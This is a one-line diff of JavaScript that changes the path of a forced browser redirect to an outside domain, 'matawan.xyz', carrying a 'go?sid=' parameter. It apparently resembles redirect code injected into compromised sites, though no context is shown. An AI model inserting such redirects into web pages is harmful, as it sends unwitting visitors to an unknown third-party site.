@@ -1,1 +1,1 @@
-window.location.href = "https://matawan.xyz/KNj/go?sid=7744";
+window.location.href = "https://matawan.xyz/TXR/go?sid=7744";
